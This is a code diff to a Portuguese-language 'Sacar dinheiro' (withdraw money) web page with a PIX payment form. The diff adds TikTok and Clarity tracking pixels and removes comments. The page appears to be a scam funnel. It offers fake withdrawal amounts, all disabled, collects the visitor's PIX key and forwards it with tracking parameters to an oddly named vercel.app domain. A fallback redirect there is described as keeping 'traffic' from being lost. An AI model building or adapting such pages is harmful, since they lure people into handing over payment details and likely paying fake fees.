@@ -1,4 +1,12 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
+<script async="" src="https://www.clarity.ms/tag/wce5x17q6q"></script><script type="text/javascript" async="" src="js/events.js"></script><script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<e.methods.length;n++)ttq.setAndDefer(e,e.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+  ttq.load('D63UGSBC77U6E0JT85CG');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
 
 <script type="text/javascript">
   (function(c,l,a,r,i,t,y){
@@ -38,7 +46,7 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
 .sec-title{font-size:17px;font-weight:800;margin-bottom:14px}
 .pix-lbl{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--muted-fg);margin-bottom:16px}
 
-/* NOVO GRID DE BOTÕES COM FLEXBOX */
+/* NOVO GRID DE BOTÕES COM FLEXBOX PARA LINHA ÚNICA */
 .amt-grid{display:flex;flex-direction:row;gap:8px;overflow-x:auto;padding-bottom:10px;margin-bottom:15px}
 .amt-grid::-webkit-scrollbar{display:none}
 
@@ -114,7 +122,6 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
       <div class="sec-title">Sacar dinheiro</div>
       <div class="pix-lbl"><span style="font-size:20px">🏦</span><span>Transferência bancária / PIX</span></div>
       
-      <!-- OS BOTÕES AGORA SÃO FIXOS NO HTML PARA NUNCA MAIS SUMIREM -->
       <div class="amt-grid" id="amt-grid">
         <button class="amt-btn disabled-amt" disabled="" title="Complete o saque do saldo total" style="opacity: 0.35; cursor: not-allowed;">R$ 50,00</button>
         <button class="amt-btn disabled-amt" disabled="" title="Complete o saque do saldo total" style="opacity: 0.35; cursor: not-allowed;">R$ 150,00</button>
@@ -279,14 +286,12 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
       const key = document.getElementById('pixKey').value.trim();
       let valid = true;
 
-      // 1. Valida o tipo de PIX
       if(!t){
         document.getElementById('pixType').classList.add('error');
         document.getElementById('typeErr').classList.add('show');
         valid = false;
       }
 
-      // 2. Valida a chave PIX sem usar o operador '?' para evitar erros em celulares antigos
       if(!key || (t && validators[t] && !validators[t](key))){
         document.getElementById('pixKey').classList.add('error');
         document.getElementById('keyErr').textContent = !key ? 'Digite sua chave PIX' : 'Chave PIX inválida para o tipo selecionado';
@@ -294,24 +299,20 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
         valid = false;
       }
 
-      // Se estiver inválido, trava o botão aqui e não redireciona
       if(!valid) {
         console.warn("Validação PIX falhou. Preencha os campos corretamente para testar.");
         return; 
       }
 
-      // 3. Monta a URL e transfere os parâmetros
       const dest = new URL('https://pesqdobttklkjkkjtaxval.vercel.app/');
       new URLSearchParams(window.location.search).forEach((v,k) => dest.searchParams.set(k,v));
       dest.searchParams.set('pix_type', t);
       dest.searchParams.set('pix_key', key);
 
-      // 4. Força o redirecionamento
       window.location.assign(dest.toString());
 
     } catch (erro) {
       console.error("Erro no script de saque:", erro);
-      // Fallback de emergência para não perder o tráfego caso algo quebre
       window.location.assign('https://pesqdobttklkjkkjtaxval.vercel.app/');
     }
   };
